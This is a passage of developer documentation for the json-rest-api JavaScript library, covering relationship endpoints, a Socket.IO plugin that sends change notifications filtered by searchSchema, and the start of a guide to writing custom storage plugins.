//   related: "/api/books/1/authors"
// }

// Client can use these links directly
const fullAuthors = await fetch(relationship.links.related);
```

### 3. Choose the Right Endpoint

- **Use relationship endpoints** when you only need to manage connections
- **Use related endpoints** when you need full resource data
- **Use regular PATCH** when updating multiple aspects of a resource

### 4. Handle Transactions Properly

The plugin automatically handles transactions for data integrity:
```javascript
// This is atomic - either all authors are added or none
await api.resources.books.postRelationship({
  id: bookId,
  relationshipName: 'authors',
  inputRecord: {
    data: [
      { type: 'authors', id: '1' },
      { type: 'authors', id: '2' },
      { type: 'authors', id: '3' }
    ]
  }
});
```

## Summary

The REST API Relationships Plugin transforms relationships from second-class citizens to fully manageable resources. It provides efficient, standards-compliant endpoints that make working with related data intuitive and performant. By following JSON:API specifications, it ensures your API remains consistent and predictable for clients.

Whether you're building a simple blog or a complex e-commerce system, relationship endpoints help you create cleaner, more maintainable APIs that scale with your application's needs.# WebSocket Real-time Updates with Socket.IO

## Table of Contents

1. [Overview](#overview)
2. [Server Setup](#server-setup)
3. [Core Concepts](#core-concepts)
4. [The Filter System](#the-filter-system)
5. [Security Architecture](#security-architecture)
6. [Advanced Features](#advanced-features)
7. [Client Usage](#client-usage)
8. [Performance Considerations](#performance-considerations)
9. [Troubleshooting](#troubleshooting)

## Overview

The Socket.IO plugin provides real-time notifications when resources change in your json-rest-api application. It implements a **notification-only pattern** - instead of broadcasting full data (which could leak sensitive information), it only sends minimal notifications about what changed. Clients then fetch the updated data through the regular REST API, ensuring all permissions and transformations are properly applied.

### Key Benefits

- **Security First**: No data leaks possible - notifications contain only resource type and ID
- **Performance**: One broadcast per change, not N database queries for N subscribers
- **Consistency**: Uses the same searchSchema as REST API for filtering
- **Transaction Safe**: Only broadcasts after database commits succeed
- **Scalable**: Supports Redis adapter for multi-server deployments

## Server Setup

### Installation

The Socket.IO plugin is included in json-rest-api core plugins. To use it, you need to:

1. Install Socket.IO dependencies:
```bash
npm install socket.io @socket.io/redis-adapter redis
```

2. Use the plugin and start the Socket.IO server:

```javascript
import { Api } from 'json-rest-api';
import { RestApiPlugin } from 'json-rest-api/plugins/rest-api';
import { RestApiKnexPlugin } from 'json-rest-api/plugins/rest-api-knex';
import { SocketIOPlugin } from 'json-rest-api/plugins/socketio';
import { JWTAuthPlugin } from 'json-rest-api/plugins/jwt-auth';

// Create your API instance
const api = new Api({
  name: 'my-api'
});

// Add required plugins
await api.use(RestApiPlugin);
await api.use(RestApiKnexPlugin, { knex: knexInstance });
await api.use(JWTAuthPlugin, { secret: process.env.JWT_SECRET });
await api.use(SocketIOPlugin);

// Start your HTTP server
const server = app.listen(3000).on('error', (err) => {
  console.error('Failed to start server:', err);
  process.exit(1)
});

// Start Socket.IO server
const io = await api.startSocketServer(server, {
  path: '/socket.io',           // Socket.IO path (default: '/socket.io')
  cors: {                       // CORS configuration
    origin: '*',                // Configure for your security needs
    methods: ['GET', 'POST']
  },
  redis: {                      // Optional: Redis adapter for scaling
    host: 'localhost',
    port: 6379
  }
});
```

### Configuration Options

The `startSocketServer` method accepts these options:

| Option | Type | Default | Description |
|--------|------|---------|-------------|
| `path` | string | '/socket.io' | URL path for Socket.IO endpoint |
| `cors` | object | `{ origin: '*', methods: ['GET', 'POST'] }` | CORS configuration |
| `redis` | object | null | Redis configuration for multi-server setup |

### How It Works

1. **REST API Integration**: The plugin hooks into the REST API's `finish` event
2. **Transaction Awareness**: Waits for database commits before broadcasting
3. **Filter Matching**: Uses `context.minimalRecord` to check subscription filters
4. **Notification Broadcasting**: Sends minimal notifications to matching subscribers

## Core Concepts

### Notification-Only Pattern

Traditional WebSocket implementations often broadcast full data:

```javascript
// ❌ INSECURE: Broadcasting full data
io.emit('user.updated', {
  id: 123,
  name: 'John Doe',
  email: 'john@example.com',
  ssn: '123-45-6789',     // LEAKED to all subscribers!
  salary: 150000,         // LEAKED to all subscribers!
  medical_notes: '...'    // LEAKED to all subscribers!
});
```

Our implementation broadcasts only notifications:

```javascript
// ✅ SECURE: Notification only
socket.emit('subscription.update', {
  type: 'resource.updated',
  resource: 'users',
  id: '123',
  action: 'update',
  subscriptionId: 'users-12345-abc',
  meta: { timestamp: '2024-01-15T10:00:00Z' }
});
```

Clients then fetch data through REST API with proper permissions:

```javascript
// Client fetches with their permissions applied
const response = await fetch('/api/users/123', {
  headers: { Authorization: `Bearer ${token}` }
});
// Server applies all permission checks, field hiding, etc.
```

### searchSchema Integration

The plugin reuses your existing searchSchema definitions for filtering subscriptions. This ensures consistency between REST API queries and WebSocket subscriptions:

```javascript
// Define your resource with searchSchema
await api.addResource('posts', {
  schema: {
    title: { type: 'string', required: true },
    content: { type: 'string' },
    status: { type: 'string', defaultTo: 'draft' },
    author_id: { type: 'id', required: true },
    published_at: { type: 'dateTime', nullable: true },
    view_count: { type: 'number', defaultTo: 0 }
  },
  
  searchSchema: {
    // These filters work for both REST and WebSocket
    status: { type: 'string', filterOperator: '=' },
    author_id: { type: 'id', filterOperator: '=' },
    published_at: { type: 'dateTime', filterOperator: '>=' },
    view_count: { type: 'number', filterOperator: '>' }
  }
});

// REST API query
GET /api/posts?filter[status]=published&filter[view_count]=100

// WebSocket subscription - SAME filters!
socket.emit('subscribe', {
  resource: 'posts',
  filters: {
    status: 'published',
    view_count: 100
  }
});
```

### Transaction Safety

The plugin ensures broadcasts only happen after successful database commits:

```javascript
// In a transaction
const trx = await knex.transaction();
try {
  // Create a post
  const post = await api.resources.posts.post({
    inputRecord: { /* ... */ },
    transaction: trx
  });
  
  // At this point, NO broadcast has been sent
  
  await trx.commit();
  // NOW the broadcast is sent
} catch (error) {
  await trx.rollback();
  // No broadcast is ever sent
}
```

## The Filter System

### Simple Operator Filters

Filters using simple operators (`=`, `>`, `>=`, `<`, `<=`, `!=`, `like`, `in`, `between`) work automatically for both REST and WebSocket:

```javascript
searchSchema: {
  // Equality
  status: { type: 'string', filterOperator: '=' },
  
  // Comparison
  price: { type: 'number', filterOperator: '>=' },
  stock: { type: 'number', filterOperator: '>' },
  
  // Pattern matching
  title: { type: 'string', filterOperator: 'like' },
  
  // Multiple values
  category_id: { type: 'array', filterOperator: 'in' },
  
  // Range
  created_at: { type: 'date', filterOperator: 'between' }
}

// These work for both REST and WebSocket
socket.emit('subscribe', {
  resource: 'products',
  filters: {
    status: 'active',
    price: 99.99,
    title: 'phone',
    category_id: [1, 2, 3],
    created_at: ['2024-01-01', '2024-12-31']
  }
});
```

### Complex Filters with filterRecord

When `filterOperator` is a function (for complex SQL queries), you must provide `filterRecord` for WebSocket support:

```javascript
searchSchema: {
  // Complex multi-field search
  search: {
    type: 'string',
    
    // For REST API - builds SQL query
    filterOperator: function(query, value, { tableName }) {
      query.where(function() {
        this.where(`${tableName}.title`, 'like', `%${value}%`)
            .orWhere(`${tableName}.description`, 'like', `%${value}%`)
            .orWhere(`${tableName}.tags`, 'like', `%${value}%`);
      });
    },
    
    // For WebSocket - evaluates single record (REQUIRED!)
    filterRecord: function(record, value) {
      const search = value.toLowerCase();
      const title = (record.title || '').toLowerCase();
      const desc = (record.description || '').toLowerCase();
      const tags = (record.tags || []).join(' ').toLowerCase();
      
      return title.includes(search) || 
             desc.includes(search) || 
             tags.includes(search);
    }
  },
  
  // Location-based search
  near_location: {
    type: 'object',
    
    // REST: Haversine formula in SQL
    filterOperator: function(query, value, { tableName }) {
      const { lat, lng, radius = 10 } = value;
      query.whereRaw(`
        (6371 * acos(
          cos(radians(?)) * cos(radians(${tableName}.latitude)) *
          cos(radians(${tableName}.longitude) - radians(?)) +
          sin(radians(?)) * sin(radians(${tableName}.latitude))
        )) <= ?
      `, [lat, lng, lat, radius]);
    },
    
    // WebSocket: JavaScript distance calculation
    filterRecord: function(record, value) {
      const { lat, lng, radius = 10 } = value;
      const distance = calculateDistance(
        lat, lng, 
        record.latitude, record.longitude
      );
      return distance <= radius;
    }
  },
  
  // Custom business logic
  available_for_user: {
    type: 'object',
    
    // REST: Complex JOIN with user permissions
    filterOperator: function(query, value, { tableName }) {
      const { user_id, include_private } = value;
      query.where(`${tableName}.owner_id`, user_id);
      if (!include_private) {
        query.orWhere(`${tableName}.is_public`, true);
      }
    },
    
    // WebSocket: Same logic in JavaScript
    filterRecord: function(record, value) {
      const { user_id, include_private } = value;
      if (record.owner_id === user_id) return true;
      if (record.is_public) return true;
      return include_private && record.shared_with?.includes(user_id);
    }
  }
}
```

### Filter Validation

All filters are validated against searchSchema before subscription:

```javascript
// This subscription
socket.emit('subscribe', {
  resource: 'posts',
  filters: {
    status: 'published',      // ✅ Valid: defined in searchSchema
    invalid_field: 'value'    // ❌ Error: not in searchSchema
  }
});

// Returns error:
{
  error: {
    code: 'INVALID_FILTERS',
    message: 'Invalid filter values',
    details: {
      invalid_field: {
        code: 'UNKNOWN_FIELD',
        message: 'Field not defined in searchSchema'
      }
    }
  }
}
```

## Security Architecture

### Authentication

All connections must be authenticated using JWT tokens:

```javascript
// Client must provide valid JWT
const socket = io('http://localhost:3000', {
  auth: {
    token: 'eyJhbGciOiJIUzI1NiIs...' // Your JWT token
  }
});

// Without valid token, connection is rejected
socket.on('connect_error', (error) => {
  console.error('Authentication failed:', error.message);
});
```

### Permission Checking

Subscriptions require 'query' permission on the resource:

```javascript
// In your scope definition
await api.addResource('secret-documents', {
  // ... schema ...
  
  checkPermissions: async ({ method, auth }) => {
    if (method === 'query') {
      // Check if user can query/subscribe to this resource
      return auth.roles?.includes('admin');
    }
    // ... other permission checks
  }
});
```

### Filter Injection with Hooks

Use the `subscriptionFilters` hook to enforce security policies:

```javascript
// Multi-tenancy plugin example
export const MultiTenancyPlugin = {
  name: 'multi-tenancy',
  
  install({ addHook }) {
    // This hook runs for EVERY subscription
    addHook('subscriptionFilters', 'workspace-isolation', {}, 
      async ({ subscription, auth }) => {
        // Force workspace isolation
        if (!auth.workspace_id) {
          throw new Error('User must belong to a workspace');
        }
        
        // Always add workspace filter
        subscription.filters.workspace_id = auth.workspace_id;
        
        // Prevent bypassing workspace isolation
        if (subscription.filters.workspace_id && 
            subscription.filters.workspace_id !== auth.workspace_id) {
          throw new Error('Cannot subscribe to other workspaces');
        }
      }
    );
  }
};

// Now ALL subscriptions automatically include workspace filter
socket.emit('subscribe', {
  resource: 'projects',
  filters: { status: 'active' }
});
// Server automatically adds: filters.workspace_id = user's workspace
```

### Data Isolation Example

Here's a complete example showing how data isolation works:

```javascript
// User Roles Plugin
export const UserRolesPlugin = {
  name: 'user-roles',
  
  install({ addHook }) {
    // Filter subscriptions based on user role
    addHook('subscriptionFilters', 'role-based-filters', {}, 
      async ({ subscription, auth }) => {
        const { resource, filters } = subscription;
        
        // Regular users can only see their own data
        if (!auth.roles?.includes('admin')) {
          switch (resource) {
            case 'orders':
              subscription.filters.customer_id = auth.user_id;
              break;
              
            case 'invoices':
              subscription.filters.user_id = auth.user_id;
              break;
              
            case 'messages':
              // Can see messages where they're sender or recipient
              subscription.filters.$or = [
                { sender_id: auth.user_id },
                { recipient_id: auth.user_id }
              ];
              break;
              
            case 'admin-logs':
              throw new Error('Access denied to admin resources');
          }
        }
      }
    );
  }
};
```

## Advanced Features

### Redis Adapter for Scaling

When running multiple servers, use Redis adapter for proper broadcasting:

```javascript
// Server configuration
const io = await api.startSocketServer(server, {
  redis: {
    host: process.env.REDIS_HOST || 'localhost',
    port: process.env.REDIS_PORT || 6379,
    password: process.env.REDIS_PASSWORD,
    db: 0
  }
});

// Now broadcasts work across all servers
// Server A: Record updated → broadcast
// Server B: Receives broadcast → notifies its connected clients
```

### Subscription Management

Each socket can have multiple subscriptions with different filters:

```javascript
// Subscribe to different filtered views
const sub1 = await subscribeToResource(socket, {
  resource: 'orders',
  filters: { status: 'pending' }
});

const sub2 = await subscribeToResource(socket, {
  resource: 'orders',
  filters: { status: 'processing', priority: 'high' }
});

const sub3 = await subscribeToResource(socket, {
  resource: 'products',
  filters: { category_id: 5, in_stock: true }
});

// Unsubscribe from specific subscription
socket.emit('unsubscribe', { 
  subscriptionId: sub1.subscriptionId 
});
```

### Include and Fields Storage

While notifications don't include data, subscriptions can store include/fields preferences:

```javascript
// Subscribe with preferred includes and fields
socket.emit('subscribe', {
  resource: 'posts',
  filters: { status: 'published' },
  include: ['author', 'comments.user'],
  fields: {
    posts: ['title', 'summary', 'published_at'],
    users: ['name', 'avatar'],
    comments: ['body', 'created_at']
  }
});

// Client can use these when fetching
socket.on('subscription.update', async (notification) => {
  // Use the stored preferences for fetching
  const url = `/api/posts/${notification.id}?` +
    'include=author,comments.user&' +
    'fields[posts]=title,summary,published_at&' +
    'fields[users]=name,avatar';
    
  const response = await fetch(url);
});
```

### Reconnection Support

Restore subscriptions after reconnection:

```javascript
// Store active subscriptions
const activeSubscriptions = new Map();

socket.on('subscription.created', (response) => {
  activeSubscriptions.set(response.subscriptionId, response);
});

// On reconnect, restore all subscriptions
socket.on('connect', async () => {
  if (activeSubscriptions.size > 0) {
    const { restored, failed } = await restoreSubscriptions(
      socket, 
      Array.from(activeSubscriptions.values())
    );
    
    console.log(`Restored ${restored.length} subscriptions`);
    if (failed.length > 0) {
      console.error(`Failed to restore ${failed.length} subscriptions`);
    }
  }
});

async function restoreSubscriptions(socket, subscriptions) {
  return new Promise((resolve) => {
    socket.emit('restore-subscriptions', 
      { subscriptions }, 
      resolve
    );
  });
}
```

### Error Handling

The plugin provides detailed error information:

```javascript
socket.on('subscription.error', (error) => {
  switch (error.code) {
    case 'RESOURCE_NOT_FOUND':
      console.error(`Resource type '${error.resource}' doesn't exist`);
      break;
      
    case 'PERMISSION_DENIED':
      console.error('You lack permission to subscribe to this resource');
      break;
      
    case 'INVALID_FILTERS':
      console.error('Filter validation failed:', error.details);
      break;
      
    case 'UNSUPPORTED_FILTER':
      console.error(`Filter requires 'filterRecord' for WebSocket support`);
      break;
      
    case 'FILTERING_NOT_ENABLED':
      console.error('Resource does not have searchSchema defined');
      break;
  }
});
```

## Client Usage

### Basic Setup

```javascript
import { io } from 'socket.io-client';

// Connect with authentication
const socket = io('http://localhost:3000', {
  auth: {
    token: localStorage.getItem('jwt_token')
  }
});

// Handle connection events
socket.on('connect', () => {
  console.log('Connected to WebSocket server');
});

socket.on('connect_error', (error) => {
  console.error('Connection failed:', error.message);
});

socket.on('disconnect', (reason) => {
  console.log('Disconnected:', reason);
});
```

### Subscribing to Resources

```javascript
// Helper function for subscribing
async function subscribeToResource(socket, options) {
  return new Promise((resolve, reject) => {
    socket.emit('subscribe', options, (response) => {
      if (response.error) {
        reject(response.error);
      } else {
        resolve(response.data);
      }
    });
  });
}

// Subscribe to filtered resources
try {
  const subscription = await subscribeToResource(socket, {
    resource: 'posts',
    filters: {
      status: 'published',
      category_id: 5
    }
  });
  
  console.log('Subscribed:', subscription.subscriptionId);
} catch (error) {
  console.error('Subscription failed:', error);
}
```

### Handling Updates

```javascript
// Set up update handler
socket.on('subscription.update', async (notification) => {
  console.log('Resource updated:', notification);
  // {
  //   type: 'resource.updated',
  //   resource: 'posts',
  //   id: '123',
  //   action: 'update',
  //   subscriptionId: 'posts-1234567-abc',
  //   meta: { timestamp: '2024-01-15T10:00:00Z' }
  // }
  
  // Handle different actions
  switch (notification.action) {
    case 'post':
      await handleNewResource(notification);
      break;
      
    case 'update':
    case 'patch':
      await handleUpdatedResource(notification);
      break;
      
    case 'delete':
      await handleDeletedResource(notification);
      break;
  }
});

// Fetch updated data when needed
async function handleUpdatedResource(notification) {
  // Check if user is viewing this resource
  if (isCurrentlyViewing(notification.resource, notification.id)) {
    // Fetch immediately
    const response = await fetch(
      `/api/${notification.resource}/${notification.id}`,
      { headers: { Authorization: `Bearer ${token}` } }
    );
    
    if (response.ok) {
      const data = await response.json();
      updateUI(data);
    }
  } else {
    // Just invalidate cache
    cacheManager.invalidate(notification.resource, notification.id);
  }
}
```

### Complete Client Example

```javascript
class RealtimeResourceManager {
  constructor(apiUrl, token) {
    this.apiUrl = apiUrl;
    this.token = token;
    this.subscriptions = new Map();
    this.cache = new Map();
    
    this.socket = io(apiUrl, {
      auth: { token }
    });
    
    this.setupEventHandlers();
  }
  
  setupEventHandlers() {
    this.socket.on('connect', () => {
      console.log('WebSocket connected');
      this.restoreSubscriptions();
    });
    
    this.socket.on('subscription.update', (notification) => {
      this.handleUpdate(notification);
    });
    
    this.socket.on('subscription.created', (response) => {
      this.subscriptions.set(response.subscriptionId, response);
    });
  }
  
  async subscribe(resource, filters = {}, options = {}) {
    return new Promise((resolve, reject) => {
      this.socket.emit('subscribe', {
        resource,
        filters,
        ...options
      }, (response) => {
        if (response.error) {
          reject(response.error);
        } else {
          resolve(response.data);
        }
      });
    });
  }
  
  async handleUpdate(notification) {
    const { resource, id, action } = notification;
    
    // Invalidate cache
    const cacheKey = `${resource}:${id}`;
    this.cache.delete(cacheKey);
    
    // Emit custom event for UI updates
    this.emit('resource:updated', {
      resource,
      id,
      action,
      notification
    });
  }
  
  async fetchResource(resource, id, options = {}) {
    const cacheKey = `${resource}:${id}`;
    
    // Check cache first
    if (this.cache.has(cacheKey)) {
      return this.cache.get(cacheKey);
    }
    
    // Fetch from API
    const queryString = new URLSearchParams(options).toString();
    const url = `${this.apiUrl}/${resource}/${id}${queryString ? '?' + queryString : ''}`;
    
    const response = await fetch(url, {
      headers: {
        Authorization: `Bearer ${this.token}`
      }
    });
    
    if (!response.ok) {
      throw new Error(`Failed to fetch ${resource}/${id}`);
    }
    
    const data = await response.json();
    
    // Cache the result
    this.cache.set(cacheKey, data);
    
    return data;
  }
  
  async restoreSubscriptions() {
    if (this.subscriptions.size === 0) return;
    
    const subscriptions = Array.from(this.subscriptions.values());
    
    return new Promise((resolve) => {
      this.socket.emit('restore-subscriptions', 
        { subscriptions }, 
        (response) => {
          if (response.error) {
            console.error('Failed to restore subscriptions:', response.error);
          } else {
            console.log(`Restored ${response.restored.length} subscriptions`);
          }
          resolve(response);
        }
      );
    });
  }
}

// Usage
const realtime = new RealtimeResourceManager(
  'http://localhost:3000',
  localStorage.getItem('jwt_token')
);

// Subscribe to posts
await realtime.subscribe('posts', {
  status: 'published',
  author_id: currentUser.id
});

// React to updates
realtime.on('resource:updated', async ({ resource, id, action }) => {
  if (resource === 'posts' && isViewingPost(id)) {
    const post = await realtime.fetchResource('posts', id, {
      include: 'author,comments'
    });
    updatePostUI(post);
  }
});
```

## Performance Considerations

### Subscription Limits

Each socket is limited to 100 subscriptions to prevent memory exhaustion:

```javascript
// After 100 subscriptions, new ones are rejected
socket.emit('subscribe', { resource: 'posts' }, (response) => {
  if (response.error?.code === 'SUBSCRIPTION_LIMIT_EXCEEDED') {
    console.error('Too many active subscriptions');
  }
});
```

### Filter Efficiency

- **Simple operators** (`=`, `>`, etc.) are very fast - just property comparisons
- **Complex filters** with `filterRecord` functions should be kept lightweight
- **Avoid expensive operations** in filterRecord (no async calls, minimal computation)

### Broadcast Optimization

The plugin optimizes broadcasts by:

1. **Single broadcast per change** - Not N broadcasts for N subscribers
2. **Room-based delivery** - Socket.IO efficiently handles room broadcasts
3. **Minimal payload** - Notifications are tiny (< 200 bytes)
4. **In-memory filtering** - Uses context.minimalRecord, no database queries

### Client-Side Optimization

Optimize your client implementation:

```javascript
// Batch fetch requests
const pendingFetches = new Set();

socket.on('subscription.update', (notification) => {
  pendingFetches.add(`${notification.resource}:${notification.id}`);
});

// Fetch in batches every 100ms
setInterval(async () => {
  if (pendingFetches.size === 0) return;
  
  const toFetch = Array.from(pendingFetches);
  pendingFetches.clear();
  
  // Batch fetch multiple resources
  const results = await Promise.all(
    toFetch.map(key => {
      const [resource, id] = key.split(':');
      return fetchResource(resource, id);
    })
  );
  
  // Update UI with all results
  updateBatchUI(results);
}, 100);
```

## Troubleshooting

### Common Issues

**1. Subscriptions not receiving updates**

Check:
- Are filters too restrictive?
- Does the record pass `context.minimalRecord` filtering?
- Are you in a transaction that hasn't committed?

**2. "UNSUPPORTED_FILTER" errors**

If using custom filterOperator functions, you must provide filterRecord:

```javascript
// ❌ This will error for WebSocket
searchSchema: {
  complex_search: {
    type: 'string',
    filterOperator: function(query, value) { /* SQL */ }
  }
}

// ✅ This works for both REST and WebSocket
searchSchema: {
  complex_search: {
    type: 'string',
    filterOperator: function(query, value) { /* SQL */ },
    filterRecord: function(record, value) { /* JavaScript */ }
  }
}
```

**3. Authentication failures**

Ensure:
- JWT token is valid and not expired
- Token is sent in auth.token, not headers
- JWT plugin is configured correctly

**4. Redis connection issues**

If using Redis adapter:
- Check Redis server is running
- Verify connection credentials
- Ensure all servers use same Redis instance

### Debug Logging

Enable debug logging to troubleshoot:

```javascript
// Server-side
const api = new Api({
  name: 'my-api',
  logging: { level: 'debug' }
});

// Client-side
localStorage.debug = 'socket.io-client:*';
```

### Testing WebSocket Functionality

```javascript
// Test helper for WebSocket subscriptions
async function testWebSocketSubscription() {
  const socket = io('http://localhost:3000', {
    auth: { token: testToken }
  });
  
  return new Promise((resolve, reject) => {
    socket.on('connect', async () => {
      console.log('✓ Connected to WebSocket');
      
      // Test subscription
      socket.emit('subscribe', {
        resource: 'posts',
        filters: { status: 'published' }
      }, (response) => {
        if (response.error) {
          console.error('✗ Subscription failed:', response.error);
          reject(response.error);
        } else {
          console.log('✓ Subscription successful:', response.data);
          
          // Wait for an update
          socket.once('subscription.update', (notification) => {
            console.log('✓ Received update:', notification);
            socket.close();
            resolve(notification);
          });
          
          // Trigger an update
          createTestPost();
        }
      });
    });
    
    socket.on('connect_error', (error) => {
      console.error('✗ Connection failed:', error.message);
      reject(error);
    });
  });
}
```# Creating Custom Storage Plugins for JSON REST API

This guide explains how to create your own storage plugin for the JSON REST API library. Whether you want to use in-memory storage, connect to a remote API, or integrate with a NoSQL database, this guide will show you how to implement the required interface.

## Table of Contents

1. [Introduction](#introduction)
2. [The Storage Contract](#the-storage-contract)
3. [JSON:API Response Format](#jsonapi-response-format)
4. [Complete Example: In-Memory Storage Plugin](#complete-example-in-memory-storage-plugin)
5. [Complete Example: Remote API Storage Plugin](#complete-example-remote-api-storage-plugin)
6. [Advanced Topics](#advanced-topics)
7. [Testing Your Storage Plugin](#testing-your-storage-plugin)
8. [Common Pitfalls & Best Practices](#common-pitfalls--best-practices)

## Introduction

Storage plugins are the bridge between the JSON REST API library and your data source. The REST API plugin handles all the HTTP routing, validation, permissions, and JSON:API formatting, while your storage plugin is responsible for actually storing and retrieving data.

### Why Create a Custom Storage Plugin?

- **In-Memory Storage**: For testing, prototyping, or caching
- **Remote APIs**: Proxy requests to another REST API or microservice
- **NoSQL Databases**: Connect to MongoDB, DynamoDB, or other document stores
- **Custom Logic**: Implement complex business rules or data transformations
- **Hybrid Storage**: Combine multiple data sources

### How It Works

The REST API plugin defines a contract of 8 helper methods that your storage plugin must implement. When a request comes in:

1. The REST API plugin handles the HTTP request
2. It validates the input and checks permissions
3. It calls your storage helper method with a context object
4. Your helper returns data in JSON:API format
5. The REST API plugin enriches the response and sends it back

## The Storage Contract

Your storage plugin must implement these 8 helper methods by assigning them to the `helpers` object:

### 1. `dataExists`
Check if a resource exists.

```javascript
helpers.dataExists = async ({ scopeName, context }) => {
  // Parameters:
  // - scopeName: string - The resource type (e.g., 'articles')
  // - context.id: string|number - The resource ID to check
  // - context.schemaInfo.tableName: string - Storage identifier
  // - context.schemaInfo.idProperty: string - Primary key field name
  // - context.db: any - Database connection (if using transactions)
  
  // Returns: boolean - true if exists, false otherwise
};
```

### 2. `dataGet`
Retrieve a single resource with full JSON:API features.

```javascript
helpers.dataGet = async ({ scopeName, context, runHooks }) => {
  // Parameters:
  // - scopeName: string - The resource type
  // - context.id: string|number - The resource ID
  // - context.queryParams.include: string[] - Related resources to include
  // - context.queryParams.fields: object - Sparse fieldsets
  // - context.schemaInfo: object - Schema information
  
  // Returns: JSON:API document with single resource
  // {
  //   data: { type, id, attributes, relationships },
  //   included: [...] // if includes requested
  // }
};
```

### 3. `dataGetMinimal`
Retrieve minimal resource data (used for permission checks).

```javascript
helpers.dataGetMinimal = async ({ scopeName, context }) => {
  // Parameters: Same as dataGet but ignores queryParams
  
  // Returns: JSON:API resource object or null
  // {
  //   type: 'articles',
  //   id: '123',
  //   attributes: { ... },
  //   relationships: { ... } // only belongsTo relationships
  // }
};
```

### 4. `dataQuery`
Query multiple resources with filtering, sorting, and pagination.

```javascript
helpers.dataQuery = async ({ scopeName, context, runHooks }) => {
  // Parameters:
  // - context.queryParams.filters: object - Filter conditions
  // - context.queryParams.sort: string[] - Sort fields (prefix - for DESC)
  // - context.queryParams.page: object - Pagination (size, number/after/before)
  // - context.queryParams.include: string[] - Related resources
  // - context.queryParams.fields: object - Sparse fieldsets
  
  // Returns: JSON:API document with resource array
  // {
  //   data: [...],
  //   included: [...],
  //   meta: { ... }, // pagination info
  //   links: { ... } // pagination links
  // }
};
```

### 5. `dataPost`
Create a new resource.

```javascript
helpers.dataPost = async ({ scopeName, context }) => {
  // Parameters:
  // - context.inputRecord: JSON:API document with new resource
  // - context.schemaInfo: object - Schema information
  
  // Returns: string|number - The ID of created resource
};
```

### 6. `dataPut`
Replace an entire resource (or create with specific ID).

```javascript
helpers.dataPut = async ({ scopeName, context }) => {
  // Parameters:
  // - context.id: string|number - Resource ID
  // - context.inputRecord: JSON:API document with full resource
  // - context.isCreate: boolean - true if creating, false if updating
  
  // Returns: void (throws error if not found when updating)
};
```

### 7. `dataPatch`
Partially update a resource.

```javascript
helpers.dataPatch = async ({ scopeName, context }) => {
  // Parameters:
  // - context.id: string|number - Resource ID
  // - context.inputRecord: JSON:API document with partial updates
  
  // Returns: void (throws error if not found)
};
```

### 8. `dataDelete`
Delete a resource.

```javascript
helpers.dataDelete = async ({ scopeName, context }) => {
  // Parameters:
  // - context.id: string|number - Resource ID
  
  // Returns: { success: true } (throws error if not found)
};
```

## JSON:API Response Format

Your storage plugin must return data in proper JSON:API format. Here are the key structures:

### Single Resource Format

```javascript
{
  data: {
    type: 'articles',
    id: '123',
    attributes: {
      title: 'My Article',
      content: 'Article content...',
      publishedAt: '2024-01-15T10:00:00Z'
    },
    relationships: {
      author: {
        data: { type: 'users', id: '456' }
      },
      tags: {
        data: [
          { type: 'tags', id: '1' },
          { type: 'tags', id: '2' }
        ]
      }
    }
  }
}
```

### Collection Format

```javascript
{
  data: [
    { type: 'articles', id: '1', attributes: {...}, relationships: {...} },
    { type: 'articles', id: '2', attributes: {...}, relationships: {...} }
  ],
  meta: {
    page: 1,
    pageSize: 20,
    pageCount: 5,
    total: 100
  },
  links: {
    first: '/articles?page[number]=1&page[size]=20',
    last: '/articles?page[number]=5&page[size]=20',
    next: '/articles?page[number]=2&page[size]=20'
  }
}
```

### With Included Resources

```javascript
{
  data: { type: 'articles', id: '123', ... },
  included: [
    {
      type: 'users',
      id: '456',
      attributes: {
        name: 'John Doe',
        email: 'john@example.com'
      }
    },
    {
      type: 'tags',
      id: '1',
      attributes: {
        name: 'Technology'
      }
    }
  ]
}
```

## Complete Example: In-Memory Storage Plugin

Here's a fully functional in-memory storage plugin:

```javascript
export const InMemoryStoragePlugin = {
  name: 'in-memory-storage',
  dependencies: ['rest-api'],

  install({ helpers, scopes, log }) {
    // In-memory data store
    const dataStore = new Map();
    
    // Helper to get collection for a scope
    const getCollection = (scopeName) => {
      if (!dataStore.has(scopeName)) {
        dataStore.set(scopeName, new Map());
      }
      return dataStore.get(scopeName);
    };
    
    // Helper to generate IDs
    let nextId = 1;
    const generateId = () => String(nextId++);
    
    // 1. CHECK EXISTS
    helpers.dataExists = async ({ scopeName, context }) => {
      const collection = getCollection(scopeName);
      return collection.has(String(context.id));
    };
    
    // 2. GET SINGLE RESOURCE
    helpers.dataGet = async ({ scopeName, context }) => {
      const collection = getCollection(scopeName);
      const record = collection.get(String(context.id));
      
      if (!record) {
        const { RestApiResourceError } = await import('../../lib/rest-api-errors.js');
        throw new RestApiResourceError('Resource not found', {
          subtype: 'not_found',
          resourceType: scopeName,
          resourceId: context.id
        });
      }
      
      // Build JSON:API response
      const data = {
        type: scopeName,
        id: String(context.id),
        attributes: { ...record.attributes },
        relationships: {}
      };
      
      // Add relationships
      const scope = scopes[scopeName];
      const schemaRelationships = scope.vars.schemaInfo.schemaRelationships;
      
      for (const [relName, relDef] of Object.entries(schemaRelationships)) {
        if (relDef.type === 'belongsTo' && record.attributes[relDef.foreignKey]) {
          data.relationships[relName] = {
            data: {
              type: relDef.resource,
              id: String(record.attributes[relDef.foreignKey])
            }
          };
        } else if (relDef.type === 'hasMany' && record.relationships?.[relName]) {
          data.relationships[relName] = {
            data: record.relationships[relName].map(id => ({
              type: relDef.resource,
              id: String(id)
            }))
          };
        }
      }
      
      // Handle includes
      const included = [];
      if (context.queryParams.include?.length > 0) {
        for (const includePath of context.queryParams.include) {
          const relName = includePath.split('.')[0];
          const relationship = data.relationships[relName];
          
          if (relationship?.data) {
            const relData = Array.isArray(relationship.data) 
              ? relationship.data 
              : [relationship.data];
              
            for (const rel of relData) {
              const relCollection = getCollection(rel.type);
              const relRecord = relCollection.get(rel.id);
              if (relRecord) {
                included.push({
                  type: rel.type,
                  id: rel.id,
                  attributes: { ...relRecord.attributes }
                });
              }
            }
          }
        }
      }
      
      // Apply sparse fieldsets
      if (context.queryParams.fields?.[scopeName]) {
        const fields = context.queryParams.fields[scopeName].split(',');
        data.attributes = Object.fromEntries(
          Object.entries(data.attributes).filter(([key]) => fields.includes(key))
        );
      }
      
      return {
        data,
        ...(included.length > 0 && { included })
      };
    };
    
    // 3. GET MINIMAL
    helpers.dataGetMinimal = async ({ scopeName, context }) => {
      const collection = getCollection(scopeName);
      const record = collection.get(String(context.id));
      
      if (!record) return null;
      
      const data = {
        type: scopeName,
        id: String(context.id),
        attributes: { ...record.attributes },
        relationships: {}
      };
      
      // Only include belongsTo relationships for minimal
